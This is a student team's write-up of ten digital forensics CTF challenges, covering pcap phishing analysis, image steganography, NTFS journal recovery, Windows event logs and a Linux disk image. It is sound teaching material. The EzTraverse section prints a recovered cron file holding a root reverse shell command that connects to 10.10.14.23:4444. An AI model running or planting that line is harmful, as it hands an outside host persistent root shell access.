<!--
meta
{
	"title": "CTF Writeup - Sudo Win | Digital Forensics",
	"excerpt": "Full forensic CTF writeup for 10 challenges solved by Team Sudo Win at President University, 2026.",
	"date": "2026-04-13",
	"category": "ctf",
	"readTime": "20 min read",
	"tags": ["ctf", "digital-forensics", "steganography", "pcap", "ntfs", "memory-forensics", "phishing"]
}
-->

# 🏴 CTF Writeup — Sudo Win

**Event:** Digital Forensic Class 1 CTF — President University, 2026  
**Team:** Sudo Win  
**Members:**
- Keira Nevrada Lay — `001202400170` *(Captain)*
- Gerald Darryl Joseph Manurung — `001202400055`
- Qwyn Celine Djimondo — `001202400205`
- Richie Obhasa — `001202400162`

---

## Table of Contents

1. [Mailer](#1-mailer)
2. [RGA?](#2-rga)
3. [TripleThreat2](#3-triplethreat2)
4. [Nightmare](#4-nightmare)
5. [lost-d4-Imp0rt4nt-Fil3](#5-lost-d4-imp0rt4nt-fil3)
6. [goTTa-fix-the-corrupT1on](#6-gotta-fix-the-corrupt1on)
7. [latte](#7-latte)
8. [MailMailSnailMail](#8-mailmailsnailmail)
9. [scout-code2](#9-scout-code2)
10. [EzTraverse](#10-eztraverse)

---

## 1. Mailer

<a id="context"></a>
### 1. Context
- **Challenge:** Mailer (Part 1 & Part 2)
- **Target:** Network capture file (`.pcap`)
- **Scope:** Email traffic analysis, malicious attachment identification, C2 traffic tracing
- **Constraints:** Noisy packet capture; flag header initially documented incorrectly as `Flag` instead of `pu-flag`
- **Success criteria:** Identify malicious filename, attacker email, and C2 destination address/port

<a id="summary"></a>
### 2. Executive Summary
A `.pcap` file was analyzed to investigate an infrastructure compromise triggered by a malicious email. A suspicious email from `customer@fakebank.com` contained a ZIP attachment (`Visa_Payment_Document.zip`) housing a `.doc` confirmed malicious by VirusTotal (46/63 detections). Session analysis revealed the infected host (`.24`) was beaconing out to the attacker's machine (`.100`) on port 113. The flag was constructed by combining the malicious filename, sender email, and C2 address with port.

**Flag:** `pu-flag{Visa_Payment_Document.zip_customer@fakebank.com_192.168.1.100:113}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Internal network infrastructure, employee workstations
- **Entry points:** Corporate email inbox — phishing email with malicious attachment
- **Trust boundaries:** External internet → internal LAN (192.168.1.x subnet)
- **Attacker goal:** Initial access via malicious document; C2 callback to attacker-controlled host

<a id="recon"></a>
### 4. Recon and Enumeration
- Loaded `.pcap` into **NetworkMiner** and **Wireshark**
- Filtered NetworkMiner's **Messages** tab for suspicious senders
- Identified `customer@fakebank.com` as anomalous — lookalike domain for a bank
- Cross-referenced frame number in Wireshark for deep-packet inspection
- Reviewed **Sessions** tab in NetworkMiner for lateral/C2 traffic patterns

<a id="exploit"></a>
### 5. Exploit Path
1. Attacker sends phishing email from `customer@fakebank.com` with `Visa_Payment_Document.zip` attachment
2. Employee opens email; embedded `.doc` (inside ZIP) executes malicious code
3. Malicious code initiates outbound connection from victim `192.168.1.24` to attacker `192.168.1.100` on port `113` (ident protocol — atypical and often unmonitored)

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Malicious file:** `Visa_Payment_Document.zip` → `Visa Payment Document.doc`
- **VirusTotal score:** 46/63 (high risk)
- **Attacker email:** `customer@fakebank.com`
- **C2 address:** `192.168.1.100:113`
- **Victim IP:** `192.168.1.24`
- **Discovery frame:** Frame 130 in Wireshark

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** Block `192.168.1.100` at the firewall; isolate the victim host for reimaging
- **Guardrails:** Implement email attachment sandboxing; block outbound connections on port 113; enforce DMARC/SPF on inbound mail
- **Regression tests:** Alert on outbound port 113 traffic; scan new email attachments with AV before delivery

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Outbound connections to unusual ports (113, 4444); emails from lookalike domains; VirusTotal detections above 10/63
- **Detection automation:** SIEM rule for RFC-unusual outbound ports; email gateway filters for ZIP-inside-DOC attachments

---

## 2. RGA?

<a id="context"></a>
### 1. Context
- **Challenge:** RGA?
- **Target:** `challenge.png` — a red-to-green gradient image
- **Scope:** Steganography via LSB (Least Significant Bit) technique
- **Constraints:** Zsteg produces many false positives; challenge title is intentionally misleading
- **Success criteria:** Extract the hidden flag from the blue channel using LSB steganography

<a id="summary"></a>
### 2. Executive Summary
A PNG image with a red-to-green gradient concealed a flag in its blue channel using LSB steganography. The challenge title "RGA?" was a deliberate misdirection — blue channel was nearly invisible to the eye but carried hidden data. Aperisolve confirmed the anomaly, and zsteg extracted the flag directly.

**Flag:** `pu-flag{blu3_ch4nn3l_in_LSB_l34ks_s3cr3ts}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Hidden flag embedded in image file
- **Entry points:** Visually normal PNG distributed as a challenge artifact
- **Trust boundaries:** Public file — appears benign to standard image viewers
- **Attacker goal:** Conceal data within carrier image undetected

<a id="recon"></a>
### 4. Recon and Enumeration
- Loaded `challenge.png` into **Aperisolve** to inspect RGB channel data
- Red and Green channels showed visible color variation; Blue channel appeared nearly empty
- On closer inspection (zoomed Aperisolve output), faint blue channel data was detectable
- AI confirmation corroborated the LSB algorithm hypothesis

<a id="exploit"></a>
### 5. Exploit Path
1. Open image in Aperisolve — observe Red and Green channels are active, Blue is anomalously quiet
2. Zoom into Blue channel decomposition — faint pixel variation detected, indicating hidden data
3. Run `zsteg challenge.png` in WSL to scan all LSB combinations
4. Identify the valid, human-readable output among zsteg candidates — yields the flag

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Carrier file:** `challenge.png` (red-to-green gradient, normal PNG structure)
- **Steganography method:** LSB in the Blue channel
- **Detection tools:** Aperisolve (channel visualization), zsteg (extraction)
- **Key indicator:** Blue channel near-absent visually but carries payload data

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** N/A (CTF challenge)
- **Guardrails:** In production contexts, scan outbound images for LSB payloads before exfiltration; use steganalysis tools in DLP pipelines
- **Regression tests:** Automated zsteg/stegdetect scan on image uploads to detect LSB steganography

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Images with near-zero blue (or any single) channel variance — statistically improbable in natural images
- **Detection automation:** Integrate steganalysis (`zsteg`, `stegdetect`) in file-upload inspection pipelines

---

## 3. TripleThreat2

<a id="context"></a>
### 1. Context
- **Challenge:** TripleThreat2
- **Target:** ZIP archive containing a PNG and Python script
- **Scope:** Multi-layer forensics — file embedding, image steganography, polyalphabetic cryptography
- **Constraints:** binwalk extraction produced a non-standard `0.zip` instead of directly readable contents
- **Success criteria:** Decrypt the flag using a key recovered from ASCII-encoded pixel data

<a id="summary"></a>
### 2. Executive Summary
A ZIP file contained a PNG and Python decryption script. The PNG harbored two steganographic layers: an encrypted ciphertext and a hidden numeric sequence. The numbers decoded via ASCII to a phrase — "PEOPLE WHO ARE NOT WANTED IN A COUNTRY" — leading to the key `PERSONA NON GRATA`. The key was fed into a Python script reversing Columnar Transposition → Atbash → Caesar to recover the flag.

**Flag:** `pu-flag{W3-1mp13mEnt-tH15-1n-St3g0-now-to-m4k3-you-B4LD-h3h3h3}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Encrypted flag
- **Entry points:** Deliberately obfuscated ZIP archive
- **Trust boundaries:** Challenge file — multiple layers of indirection to prevent casual extraction
- **Attacker goal:** Obscure flag behind three sequential encryption layers plus steganographic key hiding

<a id="recon"></a>
### 4. Recon and Enumeration
- `binwalk -e` on the ZIP reveals embedded `0.zip` (non-standard structure)
- `0.zip` contains `call.png` (suspicious compressed size) and a Python decryption script
- Aperisolve on `call.png` reveals ciphertext in one layer and an abstract image in another
- Abstract image re-analyzed in Aperisolve — yields suspicious number sequence

<a id="exploit"></a>
### 5. Exploit Path
1. Extract ZIP with `binwalk -e` → enter `0.zip` → retrieve `call.png` and Python script
2. Analyze `call.png` in Aperisolve → find ciphertext and abstract sub-image
3. Extract abstract image → re-analyze in Aperisolve → read ASCII numbers: `80 69 79 80 76 69 32 87 72 79...`
4. Convert ASCII numbers to text → `PEOPLE WHO ARE NOT WANTED IN A COUNTRY`
5. Google the phrase → answer is `PERSONA NON GRATA`
6. Set `key = "PERSONANONGRATA"` in Python script; run to reverse Columnar → Atbash → Caesar → print flag

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Carrier file:** `call.png` (anomalously high compressed size)
- **Hidden ASCII sequence:** `80 69 79 80 76 69 32 87 72 79 32 65 82 69 32 78 79 84 32 87 65 78 84 69 68 32 73 78 32 65 32 67 79 85 78 84 82 89`
- **Decoded key phrase:** `PERSONA NON GRATA`
- **Cipher chain:** Columnar Transposition → Atbash → Caesar (all reversed in decryption)

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** N/A (CTF challenge)
- **Guardrails:** Validate ZIP integrity on ingest; flag archives with nested/non-standard structures
- **Regression tests:** Automated binwalk scans on received archive files

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Archives with unusual inner structures; images with disproportionate compressed size
- **Detection automation:** Recursive file extraction and entropy analysis on archive contents

---

## 4. Nightmare

<a id="context"></a>
### 1. Context
- **Challenge:** Nightmare
- **Target:** `Application.xml` — Windows Application Event Log
- **Scope:** Event log forensics; LDAP vulnerability exploitation trace
- **Constraints:** Large log file with many routine events; relevant entry buried among noise
- **Success criteria:** Identify timestamp, faulty application, and faulty module from EventID 1000

<a id="summary"></a>
### 2. Executive Summary
A Windows Application event log was analyzed to find traces of an exploited LDAP vulnerability. Among thousands of routine system events, a single `ApplicationError` (EventID 1000) entry identified `lsass.exe` as the crashed application and `WLDAP32.dll` as the faulty module — consistent with a known LDAP-related exploitation technique. Timestamp extraction completed the flag.

**Flag:** `pu-flag{2025-01-07_01:10:13_lsass.exe_WLDAP32.dll}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Windows Active Directory / LDAP infrastructure
- **Entry points:** LDAP service exposed on domain controller; `lsass.exe` process
- **Trust boundaries:** Internal domain network; authentication services
- **Attacker goal:** Exploit LDAP vulnerability to crash or manipulate `lsass.exe` for credential access

<a id="recon"></a>
### 4. Recon and Enumeration
- Opened `Application.xml` in a web browser (Microsoft Edge) for structured viewing
- Researched LDAP implementations (Google + ChatGPT): primary target is Microsoft Active Directory
- Scanned log for anomalous entries — most are repetitive routine events
- Identified `ApplicationError` (EventID 1000) as visually distinct and more detailed than surrounding entries

<a id="exploit"></a>
### 5. Exploit Path
1. Open `Application.xml` and scan for entries with `EventID 1000` (ApplicationError)
2. Locate the entry referencing `lsass.exe` — the Windows Local Security Authority Subsystem Service
3. Extract: timestamp `2025-01-07 01:10:13`, application `lsass.exe`, module `WLDAP32.dll`
4. Format per flag schema: `pu-flag{YYYY-MM-DD_HH:MM:SS_FaultyAppName_FaultyModuleName}`

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Log file:** `Application.xml`
- **EventID:** 1000 (ApplicationError)
- **Timestamp:** `2025-01-07 01:10:13`
- **Faulty application:** `lsass.exe`
- **Faulty module:** `WLDAP32.dll`

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** Patch Windows LDAP libraries; apply relevant CVE mitigations for `WLDAP32.dll`
- **Guardrails:** Alert on `lsass.exe` crashes (EventID 1000); restrict LDAP access to authorized hosts only
- **Regression tests:** Monitor for recurring `lsass.exe` or `WLDAP32.dll` error events post-patch

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** EventID 1000 crashes involving `lsass.exe`; WLDAP32.dll faults
- **Detection automation:** SIEM alert on `lsass.exe` ApplicationError events; correlate with authentication anomalies

---

## 5. lost-d4-Imp0rt4nt-Fil3

<a id="context"></a>
### 1. Context
- **Challenge:** lost-d4-Imp0rt4nt-Fil3
- **Target:** `challenge.ad1` — forensic disk image
- **Scope:** NTFS artifact recovery; USN Journal analysis for securely deleted file
- **Constraints:** `.ad1` format requires FTK Imager; raw `$J` file requires dedicated parser
- **Success criteria:** Recover last-updated timestamp and MFT entry number of a deleted `flag.txt`

<a id="summary"></a>
### 2. Executive Summary
A forensic disk image was examined to locate a file deleted by a malicious actor. Using FTK Imager, the NTFS `$UsnJrnl\$J` artifact was identified and extracted. MFTECmd parsed the raw journal into CSV, revealing `flag.txt` with its last-updated timestamp (`2025-01-27 23:23:22`) and MFT entry number (`126638`).

**Flag:** `pu-flag{2025-01-27 23:23:22_126638}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** `flag.txt` — a file containing sensitive data
- **Entry points:** Insider/attacker with write access to the host filesystem
- **Trust boundaries:** Windows NTFS filesystem; file deletion does not erase journal records
- **Attacker goal:** Permanently destroy evidence by securely deleting the target file

<a id="recon"></a>
### 4. Recon and Enumeration
- Loaded `challenge.ad1` in **FTK Imager**
- Navigated NTFS structure — identified `$UsnJrnl` directory
- Found `$J` file with notably larger size than adjacent entries — flagged as key artifact
- Confirmed via Google: `$J` records all file system changes including deletion events
- Referenced [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md) — `MFTECmd.exe` identified as the correct parser

<a id="exploit"></a>
### 5. Exploit Path
1. Open `challenge.ad1` in FTK Imager → navigate to `$UsnJrnl\$J`
2. Export `$J` to local disk
3. Parse with `MFTECmd.exe`: `MFTECmd.exe -f $J --csv .`
4. Open output CSV → search keyword `flag` → locate `flag.txt` entry
5. Identify last-updated timestamp before rename/deletion operations: `2025-01-27 23:23:22`
6. Note corresponding MFT entry number: `126638`

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Disk image:** `challenge.ad1`
- **Key artifact:** `$UsnJrnl\$J` (NTFS USN Journal)
- **Parsed output:** `20260413014103_MFTECmd_J_Output.csv`
- **Target file:** `flag.txt`
- **Last-updated timestamp:** `2025-01-27 23:23:22`
- **MFT entry number:** `126638`

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** Preserve disk image as forensic evidence before any remediation
- **Guardrails:** Enable Windows file auditing (Object Access) to log deletions in real time; retain USN Journal logs off-host
- **Regression tests:** Periodic integrity checks on critical file directories; alert on mass-deletion events

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Bulk file deletions; USN Journal entries showing `FileDelete` + `FileRename` sequences on sensitive directories
- **Detection automation:** SIEM ingestion of Windows Security Event 4660 (file deleted) and 4663 (file access)

---

## 6. goTTa-fix-the-corrupT1on

<a id="context"></a>
### 1. Context
- **Challenge:** goTTa-fix-the-corrupT1on
- **Target:** `vi.png` — corrupted image file
- **Scope:** File corruption recovery via hex analysis; post-recovery steganography extraction
- **Constraints:** File cannot be opened by standard image viewers; hex values indicate improper encoding
- **Success criteria:** Restore the image and extract the hidden flag from the Blue channel

<a id="summary"></a>
### 2. Executive Summary
An image was transferred with its raw binary data encoded as hex values, making it unreadable. ExifTool confirmed a file format error. After identifying the encoding with HexEd.it, Python's `binascii.unhexlify` was used to reconstruct `restored.png`. AperiSolve then revealed the flag hidden in the Blue decomposer channel.

**Flag:** `pu-flag{3asy-0bfusc4t10n-4nd-st3g-does-it?}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Flag hidden inside a PNG image
- **Entry points:** Corrupted/hex-encoded image file passed as challenge artifact
- **Trust boundaries:** File integrity — altered at transfer level to obscure valid format
- **Attacker goal:** Hide data in plain sight behind two layers: corruption obfuscation + LSB steganography

<a id="recon"></a>
### 4. Recon and Enumeration
- `exiftool vi.png` → output: `File format error` — confirms structural corruption
- `hexed.it` inspection → hex values like `10 00 01 11` inconsistent with valid PNG magic bytes
- Hypothesis formed: binary content stored as ASCII hex string — requires `unhexlify` to reconstruct

<a id="exploit"></a>
### 5. Exploit Path
1. Open `vi.png` in ExifTool → confirm format error
2. Inspect in HexEd.it → identify hex-encoded binary content
3. Write Python script using `binascii.unhexlify` to convert hex content back to binary, save as `restored.png`
4. Open `restored.png` — successfully viewable
5. Upload to AperiSolve → inspect Blue channel in Decomposer → flag visible in plaintext

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Corrupted file:** `vi.png` (hex-encoded binary data)
- **Restored file:** `restored.png` (valid PNG)
- **Recovery method:** `binascii.unhexlify` in Python
- **Flag location:** Blue channel — AperiSolve Decomposer view

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** N/A (CTF challenge)
- **Guardrails:** Validate file magic bytes and format integrity on ingest; reject files failing format checks
- **Regression tests:** Automated file format validation against MIME type headers on upload endpoints

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Files failing format validation that claim common MIME types; images with non-standard hex headers
- **Detection automation:** Magic byte validation (`file` command or libmagic) in file processing pipelines

---

## 7. latte

<a id="context"></a>
### 1. Context
- **Challenge:** latte
- **Target:** `coffee-latte.png` — image with embedded data
- **Scope:** Multi-layer steganography; embedded file extraction + channel steganography
- **Constraints:** Image appears entirely normal to the naked eye
- **Success criteria:** Extract embedded image, then extract flag from color channel decomposition

<a id="summary"></a>
### 2. Executive Summary
A visually normal coffee latte image concealed a secondary PNG file embedded within it. Binwalk identified the embedded structure; AperiSolve (PCRT module) extracted and repaired the hidden PNG. Re-analyzing the extracted yellow image in AperiSolve's decomposer revealed the flag across its color channels.

**Flag:** `pu-flag{h0w-d0-y0u-f1nd-m3}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Flag hidden in a nested steganographic layer
- **Entry points:** Innocuous-looking PNG distributed as challenge artifact
- **Trust boundaries:** File appears valid — passes standard image rendering without issues
- **Attacker goal:** Two-layer concealment: file-within-file embedding + channel-based steganography

<a id="recon"></a>
### 4. Recon and Enumeration
- `exiftool coffee-latte.png` → no anomalies in metadata
- `binwalk coffee-latte.png` → reveals compressed data + ZIP footer — hidden file present
- AperiSolve (PCRT section) → recovers embedded PNG: `pcrt_recovered_4cfc11b81b6842a2b0ed70d639185e47.png`

<a id="exploit"></a>
### 5. Exploit Path
1. Run `binwalk coffee-latte.png` → confirm hidden embedded file
2. Analyze in AperiSolve → PCRT module extracts and repairs an embedded PNG
3. Download recovered yellow image
4. Re-submit recovered image to AperiSolve → inspect Decomposer color channels
5. Flag appears in channel breakdown

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Carrier file:** `coffee-latte.png`
- **Extracted file:** `pcrt_recovered_4cfc11b81b6842a2b0ed70d639185e47.png` (yellow image)
- **Detection tool:** binwalk (embedding), AperiSolve PCRT (extraction), AperiSolve Decomposer (flag)

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** N/A (CTF challenge)
- **Guardrails:** Detect file-within-file embeddings using binwalk in upload pipelines; reject images containing unexpected embedded archives
- **Regression tests:** Automated entropy scan on uploaded images; flag ZIP footers inside PNG/JPEG files

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Images containing anomalous compressed data signatures or ZIP footers
- **Detection automation:** Integrate `binwalk` into file upload inspection; alert on polyglot files

---

## 8. MailMailSnailMail

<a id="context"></a>
### 1. Context
- **Challenge:** MailMailSnailMail
- **Target:** Raw `.eml` file + SMTP/DNS logs
- **Scope:** Phishing email forensics — header spoofing, encoded tokens, fake attachments
- **Constraints:** Attacker forged internal relay hop; attachment is not a real PDF
- **Success criteria:** Identify originating IP, forged hop, user interaction event, and decode the attachment to get the flag

<a id="summary"></a>
### 2. Executive Summary
A phishing email spoofing `internalcorp.net` (as `internalc0rp.net`) was analyzed. The Received chain contained a forged hop using a private IP (`10.0.0.10`) — impossible as a public SMTP source. SMTP logs confirmed the true origin as `185.220.101.47`. A Base64 token in the email body revealed the target user (`jharris`) and next step (`decode_attachment`). The `Security_Notice.pdf` attachment was Base64-encoded text, not a PDF — decoding it yielded the flag.

**Flag:** `pu-flag{Th15-1s-4n-4tt3mpt3d-Ph1sh1ng-Y0u-H4v3-LE4rned}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Employee credentials; user `jharris` as specific target
- **Entry points:** Corporate email inbox; attacker-controlled domain `internalc0rp.net`
- **Trust boundaries:** Email authentication (SPF/DMARC failed); internal relay appearance via forged header
- **Attacker goal:** Credential phishing via domain spoofing; malicious link click + fake attachment delivery

<a id="recon"></a>
### 4. Recon and Enumeration
- Viewed `.eml` in Notepad and EML Viewer for header and body analysis
- Identified spoofed domain: `internalc0rp.net` (zero substituted for letter O)
- Traced Received chain: external IP `185.220.101.47` → forged internal hop `10.0.0.10`
- SMTP log at `09:18:43`: host `10.0.0.88` queried `securepayments-verify.com` → resolved to `185.220.101.47` → connection made (user clicked link)
- SPF fail, DMARC fail, reverse DNS mismatch all confirmed in logs

<a id="exploit"></a>
### 5. Exploit Path
1. Examine email headers → identify spoofed sender domain and forged RFC1918 relay hop
2. Correlate SMTP log timestamp `09:18:43` → confirm user interaction with malicious link
3. Extract URL token → Base64 decode → `{"user": "jharris", "next": "decode_attachment"}`
4. Decode `Message-ID` Base64 value → `check_the_attachment`
5. Open `.eml` raw → locate `Security_Notice.pdf` Base64 body → decode → extract flag

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Attacker domain:** `internalc0rp.net` (spoofed `internalcorp.net`)
- **True origin IP:** `185.220.101.47`
- **Forged hop:** `Received from mail.internalcorp.net (10.0.0.10)` — RFC1918 address, cannot be public SMTP source
- **User interaction:** `10.0.0.88` → DNS query + connection to `185.220.101.47` at `09:18:43`
- **Token decoded:** `{"user": "jharris", "next": "decode_attachment"}`
- **Attachment:** `Security_Notice.pdf` — Base64-encoded text file, not a real PDF

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** Block `185.220.101.47` and `securepayments-verify.com`; quarantine user `jharris`'s machine; reset credentials
- **Guardrails:** Enforce strict SPF/DMARC rejection; block homoglyph lookalike domains; implement email attachment sandbox analysis
- **Regression tests:** Alert on SPF/DMARC failures from domains resembling internal corporate domains

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Emails failing SPF+DMARC from lookalike domains; Base64 attachments claiming to be PDFs; forged RFC1918 relay hops in Received chains
- **Detection automation:** SIEM rule on SPF fail + DMARC fail from near-match domains; alert on internal hosts querying newly-registered external domains

---

## 9. scout-code2

<a id="context"></a>
### 1. Context
- **Challenge:** scout-code2
- **Target:** Audio file (Morse code) + `Flag.jpg` (steganographic image)
- **Scope:** Audio analysis → Morse decoding → pattern recognition → steghide extraction
- **Constraints:** Morse code lacks clear inter-word spacing; requires contextual lyric matching
- **Success criteria:** Decode Morse phrase, find hidden key in image grid, extract steghide payload

<a id="summary"></a>
### 2. Executive Summary
An audio file contained Morse code matching lyrics from the song "Still Here" by League of Legends. The decoded phrase `ITSINMYBLOODANDITSINMYVEINSIMSTILLHERE25` was the Part 1 answer. Reading letters from a grid in `Flag.jpg` left-to-right yielded the steghide passphrase `ANTSINHEELS`. Running `steghide extract -sf Flag.jpg` with passphrase `antsinheels` produced `flag.txt` containing the final flag.

**Flags:**
- Part 1: `ITSINMYBLOODANDITSINMYVEINSIMSTILLHERE25`
- Part 2: `ANTSINHEELS`
- Part 3: `pu-flag{H4v3nt-Y0u-L34rn-M0rs3-c0d3-bef0r3?}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Flag embedded via steghide in `Flag.jpg`
- **Entry points:** Audio file (Morse) + image (grid key + steghide carrier)
- **Trust boundaries:** Multi-layer challenge — audio, visual, and steganographic layers
- **Attacker goal:** Obscure flag behind three sequential puzzle layers requiring domain knowledge (Morse, scout culture, steganography)

<a id="recon"></a>
### 4. Recon and Enumeration
- Loaded audio into **Moises.ai** to separate signal components and isolate Morse dots/dashes
- Manually transcribed Morse sequence
- Matched sequence to hint URL (YouTube: "Still Here" — League of Legends Season 2024 Cinematic)
- Aligned Morse patterns word-by-word against known lyrics to reconstruct the full phrase
- Received admin hint confirming a number is embedded in the message (final `25`)

<a id="exploit"></a>
### 5. Exploit Path
1. Extract Morse from audio via Moises.ai → manually segment dots and dashes
2. Use hint URL to identify source song → align Morse with lyrics → decode `ITSINMYBLOODANDITSINMYVEINSIMSTILLHERE25`
3. Map decoded letters into the `Flag.jpg` grid boxes (left-to-right reading) → key: `ANTSINHEELS`
4. Run: `steghide extract -sf Flag.jpg` → passphrase: `antsinheels` → output: `flag.txt`
5. Read `flag.txt` → flag obtained

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Audio Morse:** `..-.....-.---.---....-..-------...--.-....-.....-.---.--...-...-......--...-...-...-........-....---..…`
- **Decoded text:** `ITSINMYBLOODANDITSINMYVEINSIMSTILLHERE25`
- **Grid key:** `ANTSINHEELS` (read left-to-right across `Flag.jpg` letter grid)
- **steghide command:** `steghide extract -sf Flag.jpg` with passphrase `antsinheels`
- **Extracted file:** `flag.txt`

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** N/A (CTF challenge)
- **Guardrails:** Steghide-embedded files can be detected with steganalysis tools (`stegdetect`); audio Morse transmission is an unconventional but real covert channel
- **Regression tests:** Audit outgoing image files for steghide-type embeddings; flag audio files with irregular signal patterns

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** Images with statistically improbable LSB distributions (steghide alters pixel values); audio files with repetitive binary-like signal patterns
- **Detection automation:** `stegdetect` integration in media upload inspections; entropy analysis on JPEGs

---

## 10. EzTraverse

<a id="context"></a>
### 1. Context
- **Challenge:** EzTraverse
- **Target:** `Challenge.img` — Linux disk image from a compromised server
- **Scope:** Linux filesystem forensics; attacker persistence via cron job
- **Constraints:** Must use Autopsy to mount and explore the image; persistence is disguised with a legitimate-sounding filename
- **Success criteria:** Identify the persistence file path and extract the embedded flag

<a id="summary"></a>
### 2. Executive Summary
A Linux disk image was loaded into Autopsy and the filesystem browsed to identify attacker persistence mechanisms. Inside `/etc/cron.d/`, a file named `sysupdate` (masquerading as a legitimate system file) contained a reverse shell cron job (`bash -i >&/dev/tcp/10.10.14.23/4444 0>&1`) and a commented-out flag.

**Flag:** `pu-flag{p3rs1st3nc3_v14_cr0nd}`

<a id="threat-model"></a>
### 3. Threat Model
- **Assets:** Compromised Linux server; root cron job persistence
- **Entry points:** `/etc/cron.d/` — world-readable, root-executed scheduled tasks
- **Trust boundaries:** System cron daemon executing files in `/etc/cron.d/` as root without further validation
- **Attacker goal:** Maintain persistent access via reverse shell; evade detection with a plausible filename (`sysupdate`)

<a id="recon"></a>
### 4. Recon and Enumeration
- Loaded `Challenge.img` into **Autopsy 4.22.1**
- Explored key Linux persistence directories: `/etc`, `/var`, `/home`
- Focused on `/etc/cron.d/` given the objective (persistence)
- Found only one file in `/etc/cron.d/`: `sysupdate`

<a id="exploit"></a>
### 5. Exploit Path
1. Load `Challenge.img` into Autopsy → mount Linux filesystem
2. Navigate to `etc/cron.d/`
3. Open `sysupdate` → review contents:
   ```
   SHELL=/bin/bash
   PATH=/usr/local/sbin:/usr/local/bin:/bin:/usr/sbin:/usr/bin
   * * * * * root bash -i>&/dev/tcp/10.10.14.23/4444 0>&1
   # flag{p3rs1st3nc3_v14_cr0nd}
   ```
4. Extract flag comment → adjust to required format: `pu-flag{p3rs1st3nc3_v14_cr0nd}`

<a id="evidence"></a>
### 6. Evidence and Artifacts
- **Disk image:** `Challenge.img`
- **Persistence file:** `/etc/cron.d/sysupdate`
- **Reverse shell payload:** `bash -i>&/dev/tcp/10.10.14.23/4444 0>&1` (every minute, as root)
- **C2 address:** `10.10.14.23:4444`
- **Flag location:** Comment line inside `sysupdate`

<a id="fix"></a>
### 7. Fix and Hardening
- **Immediate fix:** Delete `/etc/cron.d/sysupdate`; block outbound port 4444; rotate all credentials on the host
- **Guardrails:** Audit `/etc/cron.d/` and `crontab` entries regularly; alert on new files in `/etc/cron.d/`; monitor for outbound bash reverse shell patterns
- **Regression tests:** Scheduled integrity checks (e.g., AIDE/Tripwire) on `/etc/cron*` directories; alert on new root cron entries

<a id="lessons"></a>
### 8. Lessons Learned
- **Signals to monitor:** New or modified files in `/etc/cron.d/`, `/etc/crontab`; outbound connections on high-numbered ports (4444, 9001, etc.) from cron processes
- **Detection automation:** File integrity monitoring on `/etc/cron*`; SIEM rule for cron-spawned network connections; EDR alert on bash reverse shell pattern (`>&/dev/tcp/`)

---

*Writeup compiled by Team Sudo Win — President University Digital Forensic Class 1, 2026.*